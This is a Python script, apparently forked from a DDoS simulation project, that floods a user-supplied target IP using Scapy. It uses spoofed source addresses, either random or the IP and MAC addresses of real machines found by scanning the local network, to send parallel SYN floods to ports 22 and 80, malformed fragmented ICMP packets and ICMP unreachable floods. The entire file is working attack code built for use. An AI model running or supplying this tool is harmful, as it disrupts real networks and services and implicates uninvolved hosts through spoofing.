# Original Code forked from https://github.com/ricardojoserf/ddos_simulation

import random
from scapy.all import *
from scapy.all import IP, ICMP, send, TCP, RandShort, Ether
import multiprocessing
import time
import six
import pandas as pd
import subprocess


def get_random_ips(n):
    for i in range(0, int(n)):
        ip_gen = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
            "." + str(random.randint(0, 255)) + "." + \
            str(random.randint(0, 255))
        ips.append(ip_gen)
    return ips


def getIps():
    subprocess.check_output("fing -r 1 -o table,csv,\"IPs.csv\"")
    df = pd.read_csv("IPs.csv", delimiter=';', header=None)
    df = df.dropna(axis=1)
    df.columns = ["IP", 'State', "MAC"]
    del df["State"]
    return list(df.itertuples(index=False, name=None))


def sendPacketFlood(origin_ips,  dst_ip, load, n_msg):
    for origin_ip in origin_ips:
        send((IP(dst=dst_ip, src=origin_ip)/TCP(sport=RandShort(),
             dport=[22, 80], seq=12345, ack=1000, window=1000, flags="S")/load)*int(n_msg), verbose=False)


def sendPacketMF(origin_ips, dst_ip, load, n_msg):
    for origin_ip in origin_ips:
        send((IP(dst=dst_ip, src=origin_ip, flags="MF", proto=17,
             frag=0)/ICMP()/load)*int(n_msg), verbose=False)


def sendPacketT3(origin_ips, dst_ip, n_msg):
    for origin_ip in origin_ips:
        send((IP(dst=dst_ip, src=origin_ip)/ICMP(type=3, code=3))
             * int(n_msg), verbose=False)


def sendPacketEther(origin_ips, dst_ip, load, n_msg):
    for origin_ip, origin_MAC in origin_ips:
        send((Ether(src=origin_MAC)/IP(src=origin_ip, dst=dst_ip) /
             ICMP()/load)*int(n_msg), verbose=False)


if __name__ == '__main__':
	dst_ip = six.moves.input("IP to attack: ")
	n_ips = six.moves.input("\nNumber of IPs: ")
	n_msg = six.moves.input("\nNumber of messages per IP: ")
	orig_type = six.moves.input(
		"\nSelect IPs origin: \n1) Network IPs \n2) Random\nYour choice: ")

	load = "DDOSAttack"*69
	ips = []
	t0 = time.time()
	print("Target IP:", dst_ip)
	if orig_type == "2":
		print("Using Random IPs")
		print("Attacking Target...")
		ips1 = get_random_ips(n_ips)
		p2 = multiprocessing.Process(
			target=sendPacketFlood, args=(ips1, dst_ip, load, n_msg))
		p3 = multiprocessing.Process(
			target=sendPacketMF, args=(ips1,  dst_ip,  load, n_msg))
		p4 = multiprocessing.Process(
			target=sendPacketT3, args=(ips1,  dst_ip, n_msg))
		p2.start()
		p3.start()
		p4.start()
		p2.join()
		p3.join()
		p4.join()
	else:
		print("Using Network Spoofed IPs")
		print("Attacking Target...")
		ips = getIps()
		p1 = multiprocessing.Process(
			target=sendPacketEther, args=(ips,  dst_ip,load,  n_msg))
		ips1 = [ip[0] for ip in ips]
		p2 = multiprocessing.Process(
			target=sendPacketFlood, args=(ips1,  dst_ip,load,  n_msg))
		p3 = multiprocessing.Process(
			target=sendPacketMF, args=(ips1,  dst_ip, load, n_msg))
		p4 = multiprocessing.Process(
			target=sendPacketT3, args=(ips1,  dst_ip,  n_msg))
		p1.start()
		p2.start()
		p3.start()
		p4.start()
		p1.join()
		p2.join()
		p3.join()
		p4.join()

	total_s = float(time.time() - t0)
	total_p = int(n_ips) * int(n_msg)
	ratio = float(total_p)/float(total_s)
	print("\nTotal: \nTime:\t%d seconds" % (total_s))
	print("Packets:\t%d \nSpeed:\t%d pack/sec" % (total_p, ratio))
